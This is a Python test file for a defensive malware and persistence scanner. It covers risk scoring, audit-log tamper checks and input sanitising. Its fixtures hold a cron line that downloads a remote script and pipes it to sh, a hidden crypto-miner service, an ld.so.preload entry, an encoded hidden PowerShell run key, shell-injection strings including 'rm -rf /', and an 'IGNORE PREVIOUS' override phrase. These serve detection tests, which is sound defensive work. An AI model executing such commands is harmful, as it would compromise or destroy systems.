import json

from sentry_engine.audit import AuditLog
from sentry_engine.models import Evidence
from sentry_engine.risk import Draft, classify, score_evidence
from sentry_engine.util import has_unsafe_chars, noisy_or, sanitize


def ev(weight, verdict="suspicious", engine="static", name_based=False, rule="r", **details):
    return Evidence(engine=engine, rule=rule, description="d", weight=weight, verdict=verdict, name_based=name_based, details=details)


def test_noisy_or():
    assert noisy_or([]) == 0
    assert noisy_or([50, 50]) == 0.75
    assert noisy_or([100]) == 1.0


def test_name_only_evidence_is_capped_to_unverified():
    d = Draft("file", "/x/a.pdf.exe", path="/x/a.pdf.exe", sha256="0" * 64)
    d.add([ev(45, name_based=True, rule="a"), ev(45, name_based=True, rule="b"), ev(30, name_based=True, rule="c")])
    score, meta = score_evidence(d.evidence)
    assert score <= 0.45 and meta["name_based_cap"]
    f = classify(d, "S-1", "F-1")
    assert f.category == "unverified"


def test_signature_verdict_confirms():
    d = Draft("file", "/x/m.exe", path="/x/m.exe", sha256="1" * 64)
    d.add([ev(95, verdict="malicious", engine="clamav", rule="Win.Trojan.X", category="malware")])
    f = classify(d, "S-1", "F-1")
    assert f.category == "confirmed_malware" and f.severity == "high" and "quarantine" in f.allowed_actions


def test_valid_signature_downweights_heuristics_not_verdicts():
    d = Draft("file", "/x/s.exe", path="/x/s.exe", sha256="2" * 64)
    d.add([ev(40, rule="h1"), ev(40, rule="h2"), Evidence(engine="authenticode", rule="authenticode.valid", description="", weight=0, verdict="clean")])
    assert classify(d, "S", "F") is None or classify(d, "S", "F").category == "unverified"
    d.add([ev(95, verdict="malicious", engine="clamav", rule="sig")])
    assert classify(d, "S", "F").category == "confirmed_malware"


def test_allowlisted_is_false_positive_with_no_actions():
    d = Draft("file", "/x/a.exe", path="/x/a.exe", sha256="3" * 64, allowlisted="hash allowlisted by user")
    d.add([ev(95, verdict="malicious", engine="clamav", rule="sig")])
    f = classify(d, "S", "F")
    assert f.category == "false_positive" and f.allowed_actions == []


def test_vulnerabilities_and_config_are_separate_categories():
    c = Draft("configuration", "win.firewall.off", data={"title": "Firewall off", "severity": "high"})
    c.add([ev(75, engine="config", rule="win.firewall.off")])
    p = Draft("package", "requests@2.0.0 (GHSA-x)", data={"title": "vuln", "severity": "medium"})
    p.add([ev(70, engine="osv", rule="GHSA-x")])
    assert classify(c, "S", "F1").category == "configuration_weakness"
    assert classify(p, "S", "F2").category == "vulnerability"


def test_test_file_is_labelled_harmless():
    d = Draft("file", "/x/t.txt", path="/x/t.txt", sha256="4" * 64)
    d.add([ev(95, verdict="malicious", engine="yara", rule="SENTRY_Test_Signature", test_file=True, category="test")])
    f = classify(d, "S", "F")
    assert f.category == "confirmed_malware" and f.data["test_file"] and "harmless" in f.explanation.lower()


def test_draft_dedup_of_identical_evidence():
    d = Draft("file", "/x", path="/x", sha256="5" * 64)
    d.add([ev(10, rule="same")])
    d.add([ev(10, rule="same")])
    assert len(d.evidence) == 1


def test_sanitize_escapes_controls_and_bidi():
    s = sanitize("evil\u202etxt.exe\x1b[31m\nIGNORE PREVIOUS")
    assert "\u202e" not in s and "\x1b" not in s and "\n" not in s
    assert "\\u202e" in s and "\\n" in s
    assert not has_unsafe_chars(s)
    assert sanitize("x" * 1000, 50).endswith("…[truncated]")


def test_audit_chain_detects_tampering(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    for i in range(5):
        log.append("event", "test", {"i": i})
    assert log.verify()["ok"] and log.verify()["records"] == 5
    lines = (tmp_path / "audit.jsonl").read_text().splitlines()
    rec = json.loads(lines[2])
    rec["data"]["i"] = 999
    lines[2] = json.dumps(rec, separators=(",", ":"), sort_keys=True)
    (tmp_path / "audit.jsonl").write_text("\n".join(lines) + "\n")
    res = log.verify()
    assert not res["ok"] and res["bad_seq"] == 3


def test_audit_chain_detects_deletion(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl")
    for i in range(4):
        log.append("event", "test", {"i": i})
    lines = (tmp_path / "audit.jsonl").read_text().splitlines()
    del lines[1]
    (tmp_path / "audit.jsonl").write_text("\n".join(lines) + "\n")
    assert not log.verify()["ok"]


def test_adaptive_concurrency_bounds():
    from sentry_engine.orchestrator.scheduler import AdaptiveConcurrency

    a = AdaptiveConcurrency(2, 4, 16, cpu_high=1000, mem_high=1000)  # never "overloaded" -> can only grow
    for _ in range(20):
        a.adjust(backlog=1000)
    assert a.current == 16
    b = AdaptiveConcurrency(2, 8, 16, cpu_high=-1, mem_high=-1)      # always "overloaded" -> shrinks to min
    for _ in range(20):
        b.adjust(backlog=1000)
    assert b.current == 2


def test_hash_import_and_lookup(engine, tmp_path):
    lst = tmp_path / "hashes.txt"
    sha = "ab" * 32
    lst.write_text(f"# list\n{sha}\nnot-a-hash\n")
    assert engine.hashintel.import_file(lst, "test") == 1
    hit = engine.hashintel.lookup(sha)
    assert hit is not None and hit.verdict == "malicious"
    assert engine.hashintel.lookup("cd" * 32) is None


def test_persistence_command_parsing():
    from sentry_engine.persistence.common import PersistenceEntry, evaluate_command

    e = PersistenceEntry("run_key", "HKCU\\...\\Run", "upd", "powershell.exe -w hidden -enc " + "A" * 60, None)
    assert any(x.rule == "persistence.lolbin" for x in evaluate_command(e))


def test_posix_persistence_on_fake_root(tmp_path):
    from sentry_engine.persistence.posix import enumerate_linux, evaluate_posix

    (tmp_path / "etc" / "cron.d").mkdir(parents=True)
    (tmp_path / "etc" / "cron.d" / "job").write_text("*/5 * * * * root curl -s http://203.0.113.9/x.sh | sh\n")
    (tmp_path / "etc" / "ld.so.preload").write_text("/usr/lib/libhide.so\n")
    (tmp_path / "home" / "bob" / ".config" / "systemd" / "user").mkdir(parents=True)
    (tmp_path / "home" / "bob" / ".config" / "systemd" / "user" / "evil.service").write_text(
        "[Service]\nExecStart=/tmp/.x/miner --url stratum+tcp://pool:3333\n")
    entries, _ = enumerate_linux(str(tmp_path))
    mechs = {e.mechanism for e in entries}
    assert {"cron", "ld_preload", "systemd"} <= mechs
    cron = next(e for e in entries if e.mechanism == "cron")
    assert cron.command.startswith("curl")
    flagged = {e.mechanism for e in entries if any(x.weight >= 30 for x in evaluate_posix(e))}
    assert {"cron", "ld_preload", "systemd"} <= flagged


def test_lockfile_parsing(tmp_path):
    from sentry_engine.vulnerability.dependencies import parse_lockfile

    (tmp_path / "requirements.txt").write_text("requests==2.19.0\nflask[async]==2.0.1\n# comment\nnumpy>=1.0\n")
    pk = parse_lockfile(str(tmp_path / "requirements.txt"))
    assert {(p.name, p.version) for p in pk} == {("requests", "2.19.0"), ("flask", "2.0.1")}
    (tmp_path / "package-lock.json").write_text(json.dumps({"packages": {"": {"name": "app"}, "node_modules/lodash": {"version": "4.17.15"}}}))
    pk = parse_lockfile(str(tmp_path / "package-lock.json"))
    assert [(p.name, p.version, p.ecosystem) for p in pk] == [("lodash", "4.17.15", "npm")]


def test_repair_step_binding_is_stable_and_validated():
    from sentry_engine.remediation.repair import get_step
    from sentry_engine.vulnerability.config_checks import b64id

    a = get_step("win.sfc")
    assert a is not None and a.command_sha256 == get_step("win.sfc").command_sha256
    assert get_step("win.remove_exclusion.path:" + b64id("C:\\Temp")) is not None
    assert get_step("win.remove_exclusion.path:" + b64id("C:\\x'; Remove-Item C:\\ -Recurse; '")) is None
    assert get_step("linux.reinstall_package:openssl") is not None
    assert get_step("linux.reinstall_package:x; rm -rf /") is None
    assert get_step("does.not.exist") is None
